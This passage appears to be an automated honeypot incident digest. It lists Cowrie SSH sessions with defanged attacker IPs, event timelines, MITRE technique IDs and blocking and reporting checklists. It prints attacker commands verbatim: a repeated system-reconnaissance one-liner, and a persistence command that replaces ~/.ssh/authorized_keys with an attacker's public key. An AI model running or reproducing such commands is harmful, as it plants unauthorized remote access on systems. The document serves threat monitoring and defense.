| `2026-07-05 04:41:27` | `cowrie.command.input` |
| `2026-07-05 04:41:27` | `cowrie.log.closed` |
| `2026-07-05 04:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.218.206[.]66` to AbuseIPDB if not already reported
- [ ] Block `216.218.206[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4ff0e1d685e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 04:41 |
| **Last Seen** | 2026-07-05 04:41 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:41:27` | `cowrie.session.connect` |
| `2026-07-05 04:41:28` | `cowrie.client.version` |
| `2026-07-05 04:41:28` | `cowrie.client.kex` |
| `2026-07-05 04:41:35` | `cowrie.login.success` |
| `2026-07-05 04:41:38` | `cowrie.session.params` |
| `2026-07-05 04:41:38` | `cowrie.command.input` |
| `2026-07-05 04:41:41` | `cowrie.log.closed` |
| `2026-07-05 04:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d0a13863555

| Field | Detail |
|---|---|
| **Source IP** | `34.156.243[.]38` |
| **First Seen** | 2026-07-05 04:42 |
| **Last Seen** | 2026-07-05 04:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:42:16` | `cowrie.session.connect` |
| `2026-07-05 04:42:16` | `cowrie.login.success` |
| `2026-07-05 04:42:16` | `cowrie.session.params` |
| `2026-07-05 04:42:16` | `cowrie.command.input` |
| `2026-07-05 04:42:16` | `cowrie.command.input` |
| `2026-07-05 04:42:16` | `cowrie.command.failed` |
| `2026-07-05 04:42:16` | `cowrie.command.input` |
| `2026-07-05 04:42:16` | `cowrie.log.closed` |
| `2026-07-05 04:42:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.243[.]38` to AbuseIPDB if not already reported
- [ ] Block `34.156.243[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec05ebf25ccd

| Field | Detail |
|---|---|
| **Source IP** | `34.156.243[.]38` |
| **First Seen** | 2026-07-05 04:42 |
| **Last Seen** | 2026-07-05 04:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:42:24` | `cowrie.session.connect` |
| `2026-07-05 04:42:24` | `cowrie.login.success` |
| `2026-07-05 04:42:25` | `cowrie.session.params` |
| `2026-07-05 04:42:25` | `cowrie.command.input` |
| `2026-07-05 04:42:25` | `cowrie.command.failed` |
| `2026-07-05 04:42:31` | `cowrie.log.closed` |
| `2026-07-05 04:42:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.243[.]38` to AbuseIPDB if not already reported
- [ ] Block `34.156.243[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ce57135f5db

| Field | Detail |
|---|---|
| **Source IP** | `34.156.243[.]38` |
| **First Seen** | 2026-07-05 04:42 |
| **Last Seen** | 2026-07-05 04:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:42:26` | `cowrie.session.connect` |
| `2026-07-05 04:42:26` | `cowrie.login.success` |
| `2026-07-05 04:42:27` | `cowrie.session.params` |
| `2026-07-05 04:42:27` | `cowrie.command.input` |
| `2026-07-05 04:42:31` | `cowrie.log.closed` |
| `2026-07-05 04:42:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.243[.]38` to AbuseIPDB if not already reported
- [ ] Block `34.156.243[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d60ab69482ed

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 04:42 |
| **Last Seen** | 2026-07-05 04:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:42:38` | `cowrie.session.connect` |
| `2026-07-05 04:42:38` | `cowrie.client.version` |
| `2026-07-05 04:42:38` | `cowrie.client.kex` |
| `2026-07-05 04:42:39` | `cowrie.login.success` |
| `2026-07-05 04:42:39` | `cowrie.session.params` |
| `2026-07-05 04:42:39` | `cowrie.command.input` |
| `2026-07-05 04:42:40` | `cowrie.log.closed` |
| `2026-07-05 04:42:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c3412476369

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:42 |
| **Last Seen** | 2026-07-05 04:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:42:50` | `cowrie.session.connect` |
| `2026-07-05 04:42:51` | `cowrie.client.version` |
| `2026-07-05 04:42:51` | `cowrie.client.kex` |
| `2026-07-05 04:42:54` | `cowrie.login.success` |
| `2026-07-05 04:42:56` | `cowrie.session.params` |
| `2026-07-05 04:42:56` | `cowrie.command.input` |
| `2026-07-05 04:42:56` | `cowrie.command.input` |
| `2026-07-05 04:42:56` | `cowrie.command.input` |
| `2026-07-05 04:42:56` | `cowrie.command.input` |
| `2026-07-05 04:42:56` | `cowrie.command.input` |
| `2026-07-05 04:42:56` | `cowrie.command.success` |
| `2026-07-05 04:42:56` | `cowrie.command.input` |
| `2026-07-05 04:42:56` | `cowrie.command.input` |
| `2026-07-05 04:42:56` | `cowrie.command.input` |
| `2026-07-05 04:42:56` | `cowrie.command.input` |
| `2026-07-05 04:42:58` | `cowrie.log.closed` |
| `2026-07-05 04:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72dc737c3eaa

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 04:44 |
| **Last Seen** | 2026-07-05 04:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:44:01` | `cowrie.session.connect` |
| `2026-07-05 04:44:01` | `cowrie.client.version` |
| `2026-07-05 04:44:01` | `cowrie.client.kex` |
| `2026-07-05 04:44:02` | `cowrie.login.success` |
| `2026-07-05 04:44:02` | `cowrie.direct-tcpip.request` |
| `2026-07-05 04:44:02` | `cowrie.direct-tcpip.data` |
| `2026-07-05 04:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-110962030181

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:44 |
| **Last Seen** | 2026-07-05 04:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:44:17` | `cowrie.session.connect` |
| `2026-07-05 04:44:17` | `cowrie.client.version` |
| `2026-07-05 04:44:17` | `cowrie.client.kex` |
| `2026-07-05 04:44:20` | `cowrie.login.success` |
| `2026-07-05 04:44:22` | `cowrie.session.params` |
| `2026-07-05 04:44:22` | `cowrie.command.input` |
| `2026-07-05 04:44:22` | `cowrie.command.input` |
| `2026-07-05 04:44:22` | `cowrie.command.input` |
| `2026-07-05 04:44:22` | `cowrie.command.input` |
| `2026-07-05 04:44:22` | `cowrie.command.input` |
| `2026-07-05 04:44:22` | `cowrie.command.success` |
| `2026-07-05 04:44:22` | `cowrie.command.input` |
| `2026-07-05 04:44:22` | `cowrie.command.input` |
| `2026-07-05 04:44:22` | `cowrie.command.input` |
| `2026-07-05 04:44:22` | `cowrie.command.input` |
| `2026-07-05 04:44:23` | `cowrie.log.closed` |
| `2026-07-05 04:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d9a16f72ad9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:45 |
| **Last Seen** | 2026-07-05 04:45 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:45:44` | `cowrie.session.connect` |
| `2026-07-05 04:45:45` | `cowrie.client.version` |
| `2026-07-05 04:45:45` | `cowrie.client.kex` |
| `2026-07-05 04:45:49` | `cowrie.login.success` |
| `2026-07-05 04:45:53` | `cowrie.session.params` |
| `2026-07-05 04:45:53` | `cowrie.command.input` |
| `2026-07-05 04:45:53` | `cowrie.command.input` |
| `2026-07-05 04:45:53` | `cowrie.command.input` |
| `2026-07-05 04:45:53` | `cowrie.command.input` |
| `2026-07-05 04:45:53` | `cowrie.command.input` |
| `2026-07-05 04:45:53` | `cowrie.command.success` |
| `2026-07-05 04:45:53` | `cowrie.command.input` |
| `2026-07-05 04:45:53` | `cowrie.command.input` |
| `2026-07-05 04:45:53` | `cowrie.command.input` |
| `2026-07-05 04:45:53` | `cowrie.command.input` |
| `2026-07-05 04:45:54` | `cowrie.log.closed` |
| `2026-07-05 04:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf1c4603fa1b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:47 |
| **Last Seen** | 2026-07-05 04:47 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:47:12` | `cowrie.session.connect` |
| `2026-07-05 04:47:13` | `cowrie.client.version` |
| `2026-07-05 04:47:13` | `cowrie.client.kex` |
| `2026-07-05 04:47:17` | `cowrie.login.success` |
| `2026-07-05 04:47:19` | `cowrie.session.params` |
| `2026-07-05 04:47:19` | `cowrie.command.input` |
| `2026-07-05 04:47:19` | `cowrie.command.input` |
| `2026-07-05 04:47:19` | `cowrie.command.input` |
| `2026-07-05 04:47:19` | `cowrie.command.input` |
| `2026-07-05 04:47:19` | `cowrie.command.input` |
| `2026-07-05 04:47:19` | `cowrie.command.success` |
| `2026-07-05 04:47:19` | `cowrie.command.input` |
| `2026-07-05 04:47:19` | `cowrie.command.input` |
| `2026-07-05 04:47:19` | `cowrie.command.input` |
| `2026-07-05 04:47:19` | `cowrie.command.input` |
| `2026-07-05 04:47:21` | `cowrie.log.closed` |
| `2026-07-05 04:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-251c0583f8e8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:48 |
| **Last Seen** | 2026-07-05 04:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:48:38` | `cowrie.session.connect` |
| `2026-07-05 04:48:39` | `cowrie.client.version` |
| `2026-07-05 04:48:39` | `cowrie.client.kex` |
| `2026-07-05 04:48:43` | `cowrie.login.success` |
| `2026-07-05 04:48:47` | `cowrie.session.params` |
| `2026-07-05 04:48:47` | `cowrie.command.input` |
| `2026-07-05 04:48:47` | `cowrie.command.input` |
| `2026-07-05 04:48:47` | `cowrie.command.input` |
| `2026-07-05 04:48:47` | `cowrie.command.input` |
| `2026-07-05 04:48:47` | `cowrie.command.input` |
| `2026-07-05 04:48:47` | `cowrie.command.success` |
| `2026-07-05 04:48:47` | `cowrie.command.input` |
| `2026-07-05 04:48:47` | `cowrie.command.input` |
| `2026-07-05 04:48:47` | `cowrie.command.input` |
| `2026-07-05 04:48:47` | `cowrie.command.input` |
| `2026-07-05 04:48:48` | `cowrie.log.closed` |
| `2026-07-05 04:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f919706e221

| Field | Detail |
|---|---|
| **Source IP** | `115.190.197[.]138` |
| **First Seen** | 2026-07-05 04:49 |
| **Last Seen** | 2026-07-05 04:54 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:49:01` | `cowrie.session.connect` |
| `2026-07-05 04:49:01` | `cowrie.client.version` |
| `2026-07-05 04:49:02` | `cowrie.client.kex` |
| `2026-07-05 04:49:03` | `cowrie.login.success` |
| `2026-07-05 04:49:04` | `cowrie.session.params` |
| `2026-07-05 04:49:04` | `cowrie.command.input` |
| `2026-07-05 04:49:04` | `cowrie.command.failed` |
| `2026-07-05 04:49:05` | `cowrie.log.closed` |
| `2026-07-05 04:49:06` | `cowrie.session.params` |
| `2026-07-05 04:49:06` | `cowrie.command.input` |
| `2026-07-05 04:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.197[.]138` to AbuseIPDB if not already reported
- [ ] Block `115.190.197[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47a33f33f141

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:50 |
| **Last Seen** | 2026-07-05 04:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:50:04` | `cowrie.session.connect` |
| `2026-07-05 04:50:05` | `cowrie.client.version` |
| `2026-07-05 04:50:05` | `cowrie.client.kex` |
| `2026-07-05 04:50:08` | `cowrie.login.success` |
| `2026-07-05 04:50:11` | `cowrie.session.params` |
| `2026-07-05 04:50:11` | `cowrie.command.input` |
| `2026-07-05 04:50:11` | `cowrie.command.input` |
| `2026-07-05 04:50:11` | `cowrie.command.input` |
| `2026-07-05 04:50:11` | `cowrie.command.input` |
| `2026-07-05 04:50:11` | `cowrie.command.input` |
| `2026-07-05 04:50:11` | `cowrie.command.success` |
| `2026-07-05 04:50:11` | `cowrie.command.input` |
| `2026-07-05 04:50:11` | `cowrie.command.input` |
| `2026-07-05 04:50:11` | `cowrie.command.input` |
| `2026-07-05 04:50:11` | `cowrie.command.input` |
| `2026-07-05 04:50:13` | `cowrie.log.closed` |
| `2026-07-05 04:50:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e846ec14419b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:51 |
| **Last Seen** | 2026-07-05 04:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:51:29` | `cowrie.session.connect` |
| `2026-07-05 04:51:30` | `cowrie.client.version` |
| `2026-07-05 04:51:30` | `cowrie.client.kex` |
| `2026-07-05 04:51:33` | `cowrie.login.success` |
| `2026-07-05 04:51:34` | `cowrie.session.params` |
| `2026-07-05 04:51:34` | `cowrie.command.input` |
| `2026-07-05 04:51:34` | `cowrie.command.input` |
| `2026-07-05 04:51:34` | `cowrie.command.input` |
| `2026-07-05 04:51:34` | `cowrie.command.input` |
| `2026-07-05 04:51:34` | `cowrie.command.input` |
| `2026-07-05 04:51:34` | `cowrie.command.success` |
| `2026-07-05 04:51:34` | `cowrie.command.input` |
| `2026-07-05 04:51:34` | `cowrie.command.input` |
| `2026-07-05 04:51:34` | `cowrie.command.input` |
| `2026-07-05 04:51:34` | `cowrie.command.input` |
| `2026-07-05 04:51:36` | `cowrie.log.closed` |
| `2026-07-05 04:51:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca04a82976dd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:52 |
| **Last Seen** | 2026-07-05 04:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:52:53` | `cowrie.session.connect` |
| `2026-07-05 04:52:54` | `cowrie.client.version` |
| `2026-07-05 04:52:54` | `cowrie.client.kex` |
| `2026-07-05 04:52:57` | `cowrie.login.success` |
| `2026-07-05 04:52:58` | `cowrie.session.params` |
| `2026-07-05 04:52:58` | `cowrie.command.input` |
| `2026-07-05 04:52:58` | `cowrie.command.input` |
| `2026-07-05 04:52:58` | `cowrie.command.input` |
| `2026-07-05 04:52:58` | `cowrie.command.input` |
| `2026-07-05 04:52:58` | `cowrie.command.input` |
| `2026-07-05 04:52:58` | `cowrie.command.success` |
| `2026-07-05 04:52:58` | `cowrie.command.input` |
| `2026-07-05 04:52:58` | `cowrie.command.input` |
| `2026-07-05 04:52:58` | `cowrie.command.input` |
| `2026-07-05 04:52:58` | `cowrie.command.input` |
| `2026-07-05 04:53:00` | `cowrie.log.closed` |
| `2026-07-05 04:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8eb9bb8efc9

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 04:53 |
| **Last Seen** | 2026-07-05 04:53 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:53:01` | `cowrie.session.connect` |
| `2026-07-05 04:53:03` | `cowrie.client.version` |
| `2026-07-05 04:53:03` | `cowrie.client.kex` |
| `2026-07-05 04:53:08` | `cowrie.login.success` |
| `2026-07-05 04:53:12` | `cowrie.session.params` |
